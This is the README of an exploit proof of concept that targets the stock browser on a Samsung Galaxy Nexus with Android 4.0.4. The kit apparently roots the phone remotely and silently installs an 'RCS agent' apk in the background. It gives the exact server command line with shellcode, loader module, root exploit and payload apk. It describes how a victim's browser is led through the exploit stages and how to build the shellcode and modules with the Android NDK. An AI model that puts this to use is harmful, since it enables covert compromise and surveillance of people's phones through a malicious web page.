--------------------------------------------------------------------------------
Android 4.0.4 remote-to-root exploit PoC
--------------------------------------------------------------------------------

TARGET
------
This exploit PoC targets a single device and version: Samsung Galaxy Nexus
with Android 4.0.4 Galaxy Nexus Build/IMM76I using the stock Browser
application.

USAGE
-----
Launch the server by running the included server/server.py script
with the server IP address and port. A complete description of all the
parameters is given by server.py -h. Example command line:

python server/server.py 192.168.1.205 31337 ./shellcode/shellcode.raw ./module/libs/armeabi/libloadmodules.so root_exploit/exploit_silent apk/rcs.apk

This will open a server on port 31337.

From the target, navigate to the root of the server
(e.g. http://192.168.1.205:31337) with the stock Android
browser. Apart from possible debug confirmations, the following should
happen:

1] A "first stage" page is displayed and a small iframe is loaded into
it.
2] The small iframe disappears and the browser is redirected to /stage2.html
3] When the redirect is done another iframe might be briefly visible
and then is replaced with an image (server/archer.jpg), meaning that
the exploit run successfully and the RCS agent is installed in the
background.

KNOWN ISSUE: The exploit might fail with the browser crashing between
steps 1 and 2 of the list above. When the user reloads the browser, if
the debug confirmation messages are disabled the exploit is usually
automatically run again and it has a slimmer chance of failing.

BUILDING
--------

The server can be executed with the standard Python 2.7 distribution
alone. Other components need specific dependencies to be compiled:

* Shellcode
  Building the shellcode requires
  + The Android NDK from Google
  + pyelftools (https://github.com/eliben/pyelftools)
  
  The Android ARM assembler arm-linux-androideabi-as must be in your
  PATH (it is usually located in
  NDK_DIR/toolchains/arm-linux-androideabi-<version>/prebuilt/<platform>/bin )
  
  and it is built simply by running make. A shellcode.raw file should
  be generated, which is the one to be fed to the server.

* Module
  Building the module requires
  + The android NDK from Google

  It is built by adjusting the paths in module/jni/Android.mk and
  running ndk-build from the module/ directory. The resulting module
  is the compiled into module/libs.

* Root exploit
  Building the binary requires
  + The android NDK from Google

